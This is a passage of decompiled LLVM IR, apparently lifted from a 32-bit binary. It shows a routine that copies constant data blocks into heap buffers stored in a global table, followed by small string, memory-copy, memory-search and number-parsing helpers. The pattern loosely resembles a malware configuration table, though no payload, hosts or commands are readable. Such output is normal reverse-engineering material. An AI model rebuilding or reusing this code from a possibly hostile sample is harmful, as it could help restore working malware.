  %v3_14420 = call i32 @function_14688(i32 %v1_14410, i32 ptrtoint (i32* @global_var_154f0.610 to i32), i32 %v0_14418)
  %v0_14428 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14428, i32* @global_var_1db38.611, align 4
  %v1_1442c = trunc i32 %v0_14418 to i8
  store i8 %v1_1442c, i8* bitcast (i32* @global_var_1db3c.612 to i8*), align 4
  %v0_14430 = load i32, i32* %r6.global-to-local, align 4
  %v1_14430 = trunc i32 %v0_14430 to i8
  store i8 %v1_14430, i8* bitcast (i32* @global_var_1db3d.613 to i8*), align 4
  %v1_14434 = call i32 @_malloc(i32 18)
  store i32 %v1_14434, i32* %r5.global-to-local, align 4
  %v3_14444 = call i32 @function_14688(i32 %v1_14434, i32 ptrtoint (i32* @global_var_15500.615 to i32), i32 18)
  store i32 18, i32* %r3.global-to-local, align 4
  store i8 18, i8* bitcast (i32* @global_var_1db44.616 to i8*), align 4
  %v0_14454 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14454, i32* @global_var_1db40.617, align 4
  %v0_14458 = load i32, i32* %r6.global-to-local, align 4
  %v1_14458 = trunc i32 %v0_14458 to i8
  store i8 %v1_14458, i8* bitcast (i32* @global_var_1db45.618 to i8*), align 4
  %v1_1445c = call i32 @_malloc(i32 25)
  store i32 %v1_1445c, i32* %r5.global-to-local, align 4
  %v3_1446c = call i32 @function_14688(i32 %v1_1445c, i32 ptrtoint (i32* @global_var_15514.620 to i32), i32 25)
  store i32 25, i32* %r3.global-to-local, align 4
  store i8 25, i8* bitcast (i32* @global_var_1db4c.621 to i8*), align 4
  %v0_1447c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1447c, i32* @global_var_1db48.622, align 4
  %v0_14480 = load i32, i32* %r6.global-to-local, align 4
  %v1_14480 = trunc i32 %v0_14480 to i8
  store i8 %v1_14480, i8* bitcast (i32* @global_var_1db4d.623 to i8*), align 4
  %v1_14484 = call i32 @_malloc(i32 111)
  store i32 111, i32* %r5.global-to-local, align 4
  store i32 %v1_14484, i32* %r7.global-to-local, align 4
  %v3_14498 = call i32 @function_14688(i32 %v1_14484, i32 ptrtoint (i32* @global_var_15530.625 to i32), i32 111)
  %v0_1449c = load i32, i32* %r5.global-to-local, align 4
  %v0_144a0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_144a0, i32* @global_var_1db50.626, align 4
  %v1_144a4 = trunc i32 %v0_1449c to i8
  store i8 %v1_144a4, i8* bitcast (i32* @global_var_1db54.627 to i8*), align 4
  %v0_144a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_144a8 = trunc i32 %v0_144a8 to i8
  store i8 %v1_144a8, i8* bitcast (i32* @global_var_1db55.628 to i8*), align 4
  %v1_144ac = call i32 @_malloc(i32 %v0_1449c)
  %v0_144b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_144ac, i32* %r7.global-to-local, align 4
  %v3_144bc = call i32 @function_14688(i32 %v1_144ac, i32 ptrtoint (i32* @global_var_155a0.630 to i32), i32 %v0_144b0)
  %v0_144c4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_144c4, i32* @global_var_1db58.631, align 4
  %v0_144c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_144c8 = trunc i32 %v0_144c8 to i8
  store i8 %v1_144c8, i8* bitcast (i32* @global_var_1db5c.632 to i8*), align 4
  %v0_144cc = load i32, i32* %r6.global-to-local, align 4
  %v1_144cc = trunc i32 %v0_144cc to i8
  store i8 %v1_144cc, i8* bitcast (i32* @global_var_1db5d.633 to i8*), align 4
  %v1_144d0 = call i32 @_malloc(i32 110)
  %v0_144d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_144d4 = add i32 %v0_144d4, -1
  store i32 %v1_144d4, i32* %r5.global-to-local, align 4
  store i32 %v1_144d0, i32* %r7.global-to-local, align 4
  %v3_144e4 = call i32 @function_14688(i32 %v1_144d0, i32 ptrtoint (i32* @global_var_15610.635 to i32), i32 %v1_144d4)
  %v0_144e8 = load i32, i32* %r5.global-to-local, align 4
  %v0_144ec = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_144ec, i32* @global_var_1db60.636, align 4
  %v1_144f0 = trunc i32 %v0_144e8 to i8
  store i8 %v1_144f0, i8* bitcast (i32* @global_var_1db64.637 to i8*), align 4
  %v0_144f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_144f4 = trunc i32 %v0_144f4 to i8
  store i8 %v1_144f4, i8* bitcast (i32* @global_var_1db65.638 to i8*), align 4
  %v1_144f8 = call i32 @_malloc(i32 %v0_144e8)
  %v0_144fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_144f8, i32* %r7.global-to-local, align 4
  %v3_14508 = call i32 @function_14688(i32 %v1_144f8, i32 ptrtoint (i32* @global_var_15680.640 to i32), i32 %v0_144fc)
  %v0_14510 = load i32, i32* %r5.global-to-local, align 4
  %v1_14510 = trunc i32 %v0_14510 to i8
  store i8 %v1_14510, i8* bitcast (i32* @global_var_1db6c.641 to i8*), align 4
  %v0_14514 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_14514, i32* @global_var_1db68.642, align 4
  %v0_14518 = load i32, i32* %r6.global-to-local, align 4
  %v1_14518 = trunc i32 %v0_14518 to i8
  store i8 %v1_14518, i8* bitcast (i32* @global_var_1db6d.643 to i8*), align 4
  %v1_1451c = call i32 @_malloc(i32 117)
  store i32 %v1_1451c, i32* %r5.global-to-local, align 4
  %v3_1452c = call i32 @function_14688(i32 %v1_1451c, i32 ptrtoint (i32* @global_var_156f0.645 to i32), i32 117)
  store i32 117, i32* %r3.global-to-local, align 4
  %v0_14534 = load i32, i32* %r6.global-to-local, align 4
  %v1_14534 = trunc i32 %v0_14534 to i8
  %v2_14534 = load i32, i32* %r4.global-to-local, align 4
  %v3_14534 = add i32 %v2_14534, 413
  %v4_14534 = inttoptr i32 %v3_14534 to i8*
  store i8 %v1_14534, i8* %v4_14534, align 1
  %v0_14538 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14538, i32* @global_var_1db70.646, align 4
  %v0_1453c = load i32, i32* %r3.global-to-local, align 4
  %v1_1453c = trunc i32 %v0_1453c to i8
  store i8 %v1_1453c, i8* bitcast (i32* @global_var_1db74.647 to i8*), align 4
  %v2_14540 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14540, i32* %r4.global-to-local, align 4
  ret i32 %v3_1452c

; uselistorder directives
  uselistorder i32 %v1_144f8, { 1, 0 }
  uselistorder i32 %v1_144d0, { 1, 0 }
  uselistorder i32 %v1_144ac, { 1, 0 }
  uselistorder i32 %v1_14484, { 1, 0 }
  uselistorder i32 %v1_14410, { 1, 0 }
  uselistorder i32 %v1_1439c, { 1, 0 }
  uselistorder i32 %v1_14378, { 1, 0 }
  uselistorder i32 %v1_14354, { 1, 0 }
  uselistorder i32 %v1_14330, { 1, 0 }
  uselistorder i32 %v1_1430c, { 1, 0 }
  uselistorder i32 %v1_142e8, { 1, 0 }
  uselistorder i32 %v1_14224, { 1, 0 }
  uselistorder i32 %v1_1415c, { 1, 0 }
  uselistorder i32 %v1_140c0, { 1, 0 }
  uselistorder i32 %v1_1409c, { 1, 0 }
  uselistorder i32 %v1_13fd8, { 1, 0 }
  uselistorder i32 %v1_13fb0, { 1, 0 }
  uselistorder i32 %v1_13f3c, { 1, 0 }
  uselistorder i32 %v1_13e9c, { 1, 0 }
  uselistorder i32 %v1_13e28, { 1, 0 }
  uselistorder i32 %v1_13e04, { 1, 0 }
  uselistorder i32 %v1_13ddc, { 1, 0 }
  uselistorder i32 %v1_13da8, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 26, 27, 28, 29, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r6.global-to-local, { 47, 48, 49, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 50 }
  uselistorder i32* %r5.global-to-local, { 96, 97, 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 98, 99, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 92, 91, 93, 94, 95 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 24, 25, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 117, { 2, 1, 0 }
  uselistorder i32 111, { 1, 2, 0 }
  uselistorder i32 18, { 12, 2, 0, 3, 13, 4, 14, 5, 15, 11, 6, 1, 16, 17, 7, 18, 8, 19, 9, 20, 10, 21 }
  uselistorder i32 83, { 2, 1, 0 }
  uselistorder i8 23, { 1, 0 }
  uselistorder i32 23, { 6, 1, 0, 2, 7, 3, 8, 4, 9, 11, 12, 10, 5 }
  uselistorder i32 17, { 9, 3, 0, 28, 10, 11, 4, 12, 5, 13, 6, 14, 7, 15, 8, 16, 17, 1, 18, 19, 20, 2, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32 21, { 9, 4, 2, 10, 5, 11, 6, 12, 7, 13, 14, 15, 8, 0, 1, 16, 3, 17 }
  uselistorder i32 22, { 7, 1, 0, 2, 8, 3, 9, 4, 10, 12, 11, 5, 6, 13 }
  uselistorder i8 16, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 19, { 4, 8, 1, 5, 9, 6, 10, 7, 11, 0, 15, 12, 2, 13, 3, 14 }
  uselistorder i8 3, { 2, 1, 0 }
  uselistorder i8 6, { 6, 7, 4, 5, 8, 0, 9, 10, 1, 2, 3 }
  uselistorder i32 6, { 41, 15, 3, 16, 42, 0, 85, 17, 86, 43, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 4, 29, 30, 31, 32, 33, 5, 34, 44, 45, 46, 6, 47, 48, 49, 50, 7, 51, 52, 53, 54, 8, 55, 9, 10, 56, 57, 58, 35, 59, 11, 60, 61, 62, 36, 63, 12, 64, 65, 66, 37, 67, 68, 69, 38, 70, 71, 72, 73, 74, 39, 75, 13, 76, 77, 78, 79, 80, 81, 40, 82, 14, 83, 2, 84, 87, 88, 89, 90 }
  uselistorder i32 33, { 9, 2, 0, 12, 1, 10, 3, 11, 4, 5, 6, 13, 7, 14, 8, 15, 16 }
  uselistorder i32 13, { 12, 5, 2, 13, 14, 15, 59, 0, 1, 6, 7, 8, 9, 16, 17, 18, 19, 20, 10, 21, 22, 23, 24, 25, 26, 27, 28, 11, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 3, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 4, 57, 58 }
  uselistorder i8 4, { 4, 3, 2, 0, 1 }
  uselistorder i8 11, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 11, { 15, 5, 2, 16, 6, 3, 17, 7, 4, 49, 50, 51, 52, 53, 0, 18, 8, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 9, 30, 31, 32, 10, 33, 34, 35, 11, 36, 37, 38, 12, 39, 40, 41, 42, 43, 44, 45, 46, 47, 1, 48, 13, 54, 55, 56, 14, 57 }
  uselistorder i8 5, { 13, 14, 0, 1, 11, 2, 3, 4, 5, 6, 7, 8, 9, 12, 15, 10 }
  uselistorder i32 5, { 30, 16, 6, 3, 18, 31, 4, 17, 32, 1, 19, 82, 20, 83, 21, 84, 22, 85, 23, 86, 24, 87, 0, 33, 34, 35, 25, 26, 27, 28, 36, 37, 38, 39, 7, 40, 41, 42, 43, 8, 44, 45, 46, 47, 48, 49, 50, 51, 9, 52, 53, 54, 10, 55, 56, 57, 11, 58, 59, 60, 61, 12, 62, 63, 64, 65, 13, 66, 67, 68, 69, 70, 71, 72, 14, 73, 74, 75, 76, 77, 78, 79, 15, 80, 5, 81, 88, 2, 89, 90, 29, 91 }
  uselistorder i32 7, { 4, 33, 5, 18, 35, 19, 34, 2, 20, 68, 36, 21, 22, 23, 24, 25, 26, 27, 28, 29, 37, 38, 39, 6, 40, 41, 42, 43, 7, 44, 45, 46, 47, 8, 48, 9, 10, 49, 11, 50, 51, 12, 52, 53, 13, 54, 55, 14, 56, 57, 58, 59, 60, 15, 61, 62, 63, 64, 65, 16, 66, 3, 67, 0, 30, 69, 1, 31, 70, 71, 32, 17, 72 }
  uselistorder i32 29, { 7, 1, 0, 8, 9, 5, 2, 3, 4, 6 }
  uselistorder i32 (i32, i32, i32)* @function_14688, { 9, 8, 7, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 2, 1, 12, 11, 10, 6, 5, 4, 3, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1d9d8.394 to i32), { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32)* @_malloc, { 4, 3, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 1, 0, 6, 5, 2 }
  uselistorder i32 12, { 8, 21, 12, 23, 24, 76, 77, 78, 25, 22, 26, 27, 28, 29, 30, 31, 33, 34, 32, 79, 80, 81, 6, 82, 83, 85, 86, 87, 3, 89, 84, 5, 37, 35, 36, 4, 13, 14, 15, 16, 17, 18, 88, 38, 9, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 19, 50, 51, 52, 53, 54, 20, 55, 56, 57, 58, 59, 60, 10, 61, 62, 63, 64, 65, 66, 11, 67, 68, 69, 70, 71, 72, 73, 74, 7, 75, 0, 1, 90, 91, 92, 93, 2, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103 }
}

define i32 @function_1460c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1460c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_14610 = load i8, i8* %arg1, align 1
  %v4_14610 = zext i8 %v3_14610 to i32
  %v2_14614 = icmp eq i8 %v3_14610, 0
  br i1 %v2_14614, label %dec_label_pc_14630, label %bb

dec_label_pc_14630:                               ; preds = %dec_label_pc_14620, %dec_label_pc_1460c
  %merge = phi i32 [ %v4_14610, %dec_label_pc_1460c ], [ %v1_14620, %dec_label_pc_14620 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_1460c
  br label %dec_label_pc_14620

dec_label_pc_14620:                               ; preds = %dec_label_pc_14620, %bb
  %v0_14620 = phi i32 [ %v1_14620, %dec_label_pc_14620 ], [ 0, %bb ]
  %v1_14620 = add i32 %v0_14620, 1
  %v2_14624 = add i32 %v1_14620, %tmp
  %v3_14624 = inttoptr i32 %v2_14624 to i8*
  %v4_14624 = load i8, i8* %v3_14624, align 1
  %v2_14628 = icmp eq i8 %v4_14624, 0
  br i1 %v2_14628, label %dec_label_pc_14630, label %dec_label_pc_14620

; uselistorder directives
  uselistorder i32 %v1_14620, { 1, 0, 2 }
}

define i32 @function_14634(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14634:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_14634 = load i8, i8* %arg1, align 1
  %v3_14634 = zext i8 %v2_14634 to i32
  %v2_14638 = icmp eq i8 %v2_14634, 0
  br i1 %v2_14638, label %dec_label_pc_1467c, label %dec_label_pc_14640

dec_label_pc_14640:                               ; preds = %dec_label_pc_14634
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14644

dec_label_pc_14644:                               ; preds = %dec_label_pc_14644, %dec_label_pc_14640
  %v0_14644 = phi i32 [ %v1_14644, %dec_label_pc_14644 ], [ 0, %dec_label_pc_14640 ]
  %v1_14644 = add i32 %v0_14644, 1
  store i32 %v1_14644, i32* %ip.global-to-local, align 4
  %v2_14648 = add i32 %v1_14644, %tmp
  %v3_14648 = inttoptr i32 %v2_14648 to i8*
  %v4_14648 = load i8, i8* %v3_14648, align 1
  %v2_1464c = icmp eq i8 %v4_14648, 0
  br i1 %v2_1464c, label %dec_label_pc_14654, label %dec_label_pc_14644

dec_label_pc_14654:                               ; preds = %dec_label_pc_14644
  %v7_14654 = icmp eq i32 %v0_14644, -2
  br i1 %v7_14654, label %dec_label_pc_14674, label %dec_label_pc_14660.preheader

dec_label_pc_14660.preheader:                     ; preds = %dec_label_pc_14654, %dec_label_pc_1467c
  %storemerge = phi i32 [ %v3_14634, %dec_label_pc_1467c ], [ %v1_14644, %dec_label_pc_14654 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1466c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14660

dec_label_pc_14660:                               ; preds = %dec_label_pc_14660.dec_label_pc_14660_crit_edge, %dec_label_pc_14660.preheader
  %v2_1466c = phi i32 [ %v5_1466c, %dec_label_pc_14660.dec_label_pc_14660_crit_edge ], [ %v2_1466c.pre, %dec_label_pc_14660.preheader ]
  %v0_14664 = phi i32 [ %v0_14664.pre, %dec_label_pc_14660.dec_label_pc_14660_crit_edge ], [ %tmp, %dec_label_pc_14660.preheader ]
  %v0_14660 = phi i32 [ %v0_14660.pre, %dec_label_pc_14660.dec_label_pc_14660_crit_edge ], [ %storemerge, %dec_label_pc_14660.preheader ]
  %v1_14660 = add i32 %v0_14660, -1
  store i32 %v1_14660, i32* %r2.global-to-local, align 4
  %v1_14664 = inttoptr i32 %v0_14664 to i8*
  %v2_14664 = load i8, i8* %v1_14664, align 1
  %v5_14664 = add i32 %v0_14664, 1
  store i32 %v5_14664, i32* %r1.global-to-local, align 4
  %v3_14668 = icmp eq i32 %v0_14660, 0
  %v3_1466c = inttoptr i32 %v2_1466c to i8*
  store i8 %v2_14664, i8* %v3_1466c, align 1
  %v4_1466c = load i32, i32* @r0, align 4
  %v5_1466c = add i32 %v4_1466c, 1
  store i32 %v5_1466c, i32* @r0, align 4
  br i1 %v3_14668, label %dec_label_pc_14674.loopexit, label %dec_label_pc_14660.dec_label_pc_14660_crit_edge

dec_label_pc_14660.dec_label_pc_14660_crit_edge:  ; preds = %dec_label_pc_14660
  %v0_14660.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_14664.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14660

dec_label_pc_14674.loopexit:                      ; preds = %dec_label_pc_14660
  %v0_14674.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14674

dec_label_pc_14674:                               ; preds = %dec_label_pc_14674.loopexit, %dec_label_pc_14654
  %v0_14674 = phi i32 [ %v0_14674.pre, %dec_label_pc_14674.loopexit ], [ %v1_14644, %dec_label_pc_14654 ]
  ret i32 %v0_14674

dec_label_pc_1467c:                               ; preds = %dec_label_pc_14634
  store i32 %v3_14634, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14660.preheader

; uselistorder directives
  uselistorder i32 %v5_1466c, { 1, 0 }
  uselistorder i32 %v0_14664, { 1, 0 }
  uselistorder i32 %v1_14644, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v3_14634, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_14660.preheader, { 1, 0 }
}

define i32 @function_14688(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14688:
  %ip.global-to-local = alloca i32, align 4
  %v2_14688 = icmp eq i32 %arg3, 0
  br i1 %v2_14688, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_14694, %dec_label_pc_14688
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_14688
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14694

dec_label_pc_14694:                               ; preds = %dec_label_pc_14694, %bb
  %v0_14694 = phi i32 [ %v1_1469c, %dec_label_pc_14694 ], [ 0, %bb ]
  %v2_14694 = add i32 %v0_14694, %arg2
  %v3_14694 = inttoptr i32 %v2_14694 to i8*
  %v4_14694 = load i8, i8* %v3_14694, align 1
  %v4_14698 = add i32 %v0_14694, %arg1
  %v5_14698 = inttoptr i32 %v4_14698 to i8*
  store i8 %v4_14694, i8* %v5_14698, align 1
  %v0_1469c = load i32, i32* %ip.global-to-local, align 4
  %v1_1469c = add i32 %v0_1469c, 1
  store i32 %v1_1469c, i32* %ip.global-to-local, align 4
  %v9_146a0 = icmp eq i32 %v1_1469c, %arg3
  br i1 %v9_146a0, label %.loopexit, label %dec_label_pc_14694

; uselistorder directives
  uselistorder i32 %v1_1469c, { 1, 2, 0 }
}

define i32 @function_146ac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_146ac:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v2_146ac = icmp eq i32 %arg2, 0
  br i1 %v2_146ac, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_146bc, %dec_label_pc_146ac
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_146ac
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_146bc

dec_label_pc_146bc:                               ; preds = %dec_label_pc_146bc.dec_label_pc_146bc_crit_edge, %bb
  %v2_146bc = phi i32 [ %v1_146c0, %dec_label_pc_146bc.dec_label_pc_146bc_crit_edge ], [ 0, %bb ]
  %v0_146bc.off0 = phi i8 [ %extract.t, %dec_label_pc_146bc.dec_label_pc_146bc_crit_edge ], [ 0, %bb ]
  %v4_146bc = add i32 %v2_146bc, %arg1
  %v5_146bc = inttoptr i32 %v4_146bc to i8*
  store i8 %v0_146bc.off0, i8* %v5_146bc, align 1
  %v0_146c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_146c0 = add i32 %v0_146c0, 1
  store i32 %v1_146c0, i32* %r3.global-to-local, align 4
  %v9_146c4 = icmp eq i32 %v1_146c0, %arg2
  br i1 %v9_146c4, label %.loopexit, label %dec_label_pc_146bc.dec_label_pc_146bc_crit_edge

dec_label_pc_146bc.dec_label_pc_146bc_crit_edge:  ; preds = %dec_label_pc_146bc
  %v0_146bc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_146bc.pre to i8
  br label %dec_label_pc_146bc

; uselistorder directives
  uselistorder i32 %v1_146c0, { 1, 2, 0 }
}

define i32 @function_146d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_146d0:
  %v7_146e4 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_146e4, label %dec_label_pc_146e8, label %dec_label_pc_146f0

dec_label_pc_146e8:                               ; preds = %dec_label_pc_14704, %dec_label_pc_146d0, %dec_label_pc_146f0
  ret i32 -1

dec_label_pc_146f0:                               ; preds = %dec_label_pc_146d0
  %tmp10 = icmp slt i32 %arg2, 1
  br i1 %tmp10, label %dec_label_pc_146e8, label %dec_label_pc_146f8

dec_label_pc_146f8:                               ; preds = %dec_label_pc_146f0
  br label %dec_label_pc_14710

dec_label_pc_14704:                               ; preds = %dec_label_pc_14728, %dec_label_pc_14710
  %v1_14704 = add i32 %v0_14730, 1
  %v9_14708 = icmp eq i32 %v1_14704, %arg2
  br i1 %v9_14708, label %dec_label_pc_146e8, label %dec_label_pc_14710

dec_label_pc_14710:                               ; preds = %dec_label_pc_14704, %dec_label_pc_146f8
  %v0_14730 = phi i32 [ %v1_14704, %dec_label_pc_14704 ], [ 0, %dec_label_pc_146f8 ]
  %v0_1471c = phi i32 [ %v1_1471c., %dec_label_pc_14704 ], [ 0, %dec_label_pc_146f8 ]
  %v2_14710 = add i32 %v0_1471c, %arg3
  %v3_14710 = inttoptr i32 %v2_14710 to i8*
  %v4_14710 = load i8, i8* %v3_14710, align 1
  %v2_14714 = add i32 %v0_14730, %arg1
  %v3_14714 = inttoptr i32 %v2_14714 to i8*
  %v4_14714 = load i8, i8* %v3_14714, align 1
  %v9_14718 = icmp eq i8 %v4_14714, %v4_14710
  %v1_1471c = add i32 %v0_1471c, 1
  %v1_1471c. = select i1 %v9_14718, i32 %v1_1471c, i32 0
  br i1 %v9_14718, label %dec_label_pc_14728, label %dec_label_pc_14704

dec_label_pc_14728:                               ; preds = %dec_label_pc_14710
  %v9_14728 = icmp eq i32 %v1_1471c., %arg4
  br i1 %v9_14728, label %dec_label_pc_14730, label %dec_label_pc_14704

dec_label_pc_14730:                               ; preds = %dec_label_pc_14728
  %v1_14730 = add i32 %v0_14730, 1
  ret i32 %v1_14730

; uselistorder directives
  uselistorder i1 %v9_14718, { 1, 0 }
  uselistorder i32 %v0_1471c, { 1, 0 }
  uselistorder label %dec_label_pc_146e8, { 0, 2, 1 }
}

define i32 @function_14738(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14738:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_14744

dec_label_pc_14744:                               ; preds = %.thread, %dec_label_pc_1475c, %bb, %dec_label_pc_14738
  %v0_14744 = phi i32 [ %tmp, %dec_label_pc_14738 ], [ %v5_14744, %bb ], [ %v5_14744, %dec_label_pc_1475c ], [ %v5_14744, %.thread ]
  %v1_14744 = inttoptr i32 %v0_14744 to i8*
  %v2_14744 = load i8, i8* %v1_14744, align 1
  %v5_14744 = add i32 %v0_14744, 1
  %v7_1474c = icmp eq i8 %v2_14744, 9
  br i1 %v7_1474c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_14744
  br label %dec_label_pc_14744

bb:                                               ; preds = %dec_label_pc_14744
  %v8_14750 = icmp eq i8 %v2_14744, 32
  br i1 %v8_14750, label %dec_label_pc_14744, label %dec_label_pc_1475c

dec_label_pc_1475c:                               ; preds = %bb
  %v7_1475c = icmp eq i8 %v2_14744, 10
  br i1 %v7_1475c, label %dec_label_pc_14744, label %dec_label_pc_14764

dec_label_pc_14764:                               ; preds = %dec_label_pc_1475c
  %v7_14764 = icmp eq i8 %v2_14744, 45
  br i1 %v7_14764, label %dec_label_pc_14844, label %dec_label_pc_1476c

dec_label_pc_1476c:                               ; preds = %dec_label_pc_14764
  %v7_1476c = icmp eq i8 %v2_14744, 43
  br i1 %v7_1476c, label %bb54, label %dec_label_pc_1477c

bb54:                                             ; preds = %dec_label_pc_1476c
  %v2_14770 = inttoptr i32 %v5_14744 to i8*
  %v3_14770 = load i8, i8* %v2_14770, align 1
  %v6_14770 = add i32 %v0_14744, 2
  br label %dec_label_pc_1477c

dec_label_pc_1477c:                               ; preds = %bb54, %dec_label_pc_1476c, %dec_label_pc_14844
  %v0_1482842 = phi i32 [ %v5_14844, %dec_label_pc_14844 ], [ %v5_14744, %dec_label_pc_1476c ], [ %v6_14770, %bb54 ]
  %v0_147a417.in = phi i8 [ %v2_14844, %dec_label_pc_14844 ], [ %v2_14744, %dec_label_pc_1476c ], [ %v3_14770, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_14844 ], [ 2147483647, %dec_label_pc_1476c ], [ 2147483647, %bb54 ]
  %v0_14854 = phi i32 [ 1, %dec_label_pc_14844 ], [ 0, %dec_label_pc_1476c ], [ 0, %bb54 ]
  %v2_14784 = urem i32 %storemerge1, %arg2
  %v2_14794 = udiv i32 %storemerge1, %arg2
  store i32 %v2_14794, i32* @lr, align 4
  br label %dec_label_pc_147a4

dec_label_pc_147a4:                               ; preds = %.thread8, %dec_label_pc_1477c
  %v0_14828 = phi i32 [ %v5_14828, %.thread8 ], [ %v0_1482842, %dec_label_pc_1477c ]
  %v2_1482011 = phi i32 [ %v1_1483c29, %.thread8 ], [ 0, %dec_label_pc_1477c ]
  %v1_147fc = phi i32 [ %v0_1483027, %.thread8 ], [ 0, %dec_label_pc_1477c ]
  %v1_147e4.in = phi i8 [ %v2_14828, %.thread8 ], [ %v0_147a417.in, %dec_label_pc_1477c ]
  %v1_147e4 = zext i8 %v1_147e4.in to i32
  %v1_147a4 = urem i32 %v1_147e4, 256
  %v1_147a8 = add nsw i32 %v1_147a4, -48
  %v1_147b0 = add nsw i32 %v1_147a4, -97
  %v1_147b4 = add nsw i32 %v1_147e4, -48
  %v1_147b8 = add nsw i32 %v1_147a4, -65
  %tmp77 = icmp ult i32 %v1_147a8, 10
  br i1 %tmp77, label %dec_label_pc_147e8, label %dec_label_pc_147c0

dec_label_pc_147c0:                               ; preds = %dec_label_pc_147a4
  %v2_147c0 = icmp ugt i32 %v1_147b8, 24
